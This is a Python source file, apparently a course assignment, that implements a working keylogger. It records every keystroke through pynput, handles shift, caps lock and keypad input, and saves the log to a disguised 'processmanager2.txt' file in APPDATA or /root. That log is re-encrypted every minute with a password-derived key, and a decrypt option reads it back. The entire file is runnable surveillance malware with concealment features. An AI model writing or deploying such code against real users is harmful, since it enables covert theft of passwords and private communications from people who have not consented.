# ***************
# Walt
# 05 Jun 24
# Csc842 - cycle 4
# ***************

import os
import argparse
import atexit
from threading import Timer
from pynput.keyboard import Key, Listener   #need to install library
from cryptography.fernet import Fernet   #need to install library
import base64
import hashlib

# Determine the default path to save the log file based on the operating system
def get_default_path():
    if os.name == 'nt':  # Windows
        return os.path.join(os.environ['APPDATA'], 'processmanager2.txt')
    elif os.name == 'posix':  # Linux
        return '/root/processmanager2.txt'
    else:
        raise OSError("Unsupported operating system")

# Generate a cryptographic key from the provided password
def generate_key(password):
    return base64.urlsafe_b64encode(hashlib.sha256(password.encode()).digest())

# Encrypt data using the generated key
def encrypt(data, key):
    fernet = Fernet(key)
    return fernet.encrypt(data.encode())

# Decrypt data using the generated key
def decrypt(data, key):
    fernet = Fernet(key)
    return fernet.decrypt(data).decode()

# Flags to track the state of shift and caps lock keys
shift_pressed = False
caps_lock_enabled = False

# Mapping for numeric keypad virtual key codes to characters.pynput was not able to read it properly.
num_keypad_vk_to_char = {
    96: '0', 97: '1', 98: '2', 99: '3', 100: '4',
    101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
    110: '.', 111: '/', 106: '*', 109: '-', 107: '+'
}

# Function to write keystrokes to a temporary file
def write_temp_file(key, temp_path, is_release=False):
    global shift_pressed, caps_lock_enabled
    with open(temp_path, 'a') as f:
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
            if not is_release:
                if shift_pressed or caps_lock_enabled:
                    f.write(char.upper())
                else:
                    f.write(char.lower())
        elif hasattr(key, 'vk') and key.vk in num_keypad_vk_to_char:
            if not is_release:
                f.write(num_keypad_vk_to_char[key.vk])
        else:
            k = str(key).replace("'", "")
            if k == 'Key.backspace' and not is_release:
                f.seek(f.tell() - 1, os.SEEK_SET)
                f.truncate()
            elif k == 'Key.enter' and not is_release:
                f.write('[Enter]\n')
            elif k == 'Key.space' and not is_release:
                f.write(' ')
            elif k == 'Key.caps_lock' and not is_release:
                caps_lock_enabled = not caps_lock_enabled
                if caps_lock_enabled:
                    f.write(' [Caps Lock Enabled] ')
                else:
                    f.write(' [Caps Lock Disabled] ')
            elif k == 'Key.shift' or k == 'Key.shift_r':
                shift_pressed = not is_release

# Function to encrypt the temporary log file and save it to the specified path
def encrypt_file(temp_path, path, key):
    if os.path.exists(temp_path):
        with open(temp_path, 'r') as f:
            data = f.read()
        encrypted_data = encrypt(data, key)
        with open(path, 'wb') as f:
            f.write(encrypted_data)

# Function to periodically encrypt the log file every specified interval (default 60 seconds)
def periodic_encrypt(temp_path, path, key, interval=60):
    encrypt_file(temp_path, path, key)
    Timer(interval, periodic_encrypt, [temp_path, path, key, interval]).start()

# Main function to parse arguments and start the keylogger
def main():
    parser = argparse.ArgumentParser(description="A simple keylogger script")
    parser.add_argument('--path', type=str, help="Specify the file path to save the key logs. a default path will be used based on the os.")
    parser.add_argument('--password', type=str, required=True, help="Password to encrypt/decrypt the log file")
    parser.add_argument('--decrypt', action='store_true', help="Decrypt the log file")

    args = parser.parse_args()
    path = args.path if args.path else get_default_path()
    temp_path = path + '.tmp'

    key = generate_key(args.password)

    if args.decrypt:
        with open(path, 'rb') as f:
            encrypted_data = f.read()
        decrypted_data = decrypt(encrypted_data, key)
        print("Decrypted Data:\n", decrypted_data)
    else:
        os.makedirs(os.path.dirname(path), exist_ok=True)

        # Ensure the log file is encrypted on exit
        atexit.register(encrypt_file, temp_path, path, key)

        # Start periodic encryption
        periodic_encrypt(temp_path, path, key)

        try:
            with Listener(
                on_press=lambda key: write_temp_file(key, temp_path),
                on_release=lambda key: write_temp_file(key, temp_path, is_release=True)
            ) as listener:
                listener.join()
        except KeyboardInterrupt as e:
            pass

if __name__ == "__main__":
    main()
